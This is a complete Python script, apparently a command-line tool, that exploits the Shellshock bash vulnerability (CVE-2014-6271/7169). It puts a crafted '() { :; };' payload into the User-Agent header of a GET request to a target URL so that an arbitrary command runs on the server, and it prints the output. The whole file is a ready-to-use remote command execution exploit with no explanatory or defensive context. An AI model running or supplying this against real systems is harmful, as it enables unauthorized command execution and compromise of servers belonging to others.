import requests
import argparse
import re

def exploit(target_url, command):
    if not re.match(r'^https?://', target_url):
        target_url = f"https://{target_url}"

    request_headers = {'User-Agent': f'() {{ :; }}; echo; echo; /bin/bash -c \'{command}\''}
    try:
        response = requests.get(target_url, headers=request_headers)
        print(f"Server response: {response.text}")
    except requests.exceptions.RequestException as request_error:
        print(f"Error when making the request with the User Agent {[command]} -> {request_error}")

def main():
    parser = argparse.ArgumentParser("CVE-2014-6271 & CVE-2014-7169 | Shellshock")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-c", "--command", required=True)

    args = parser.parse_args()
    try:
        exploit(args.target, args.command)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)

if __name__ == '__main__':
    main()
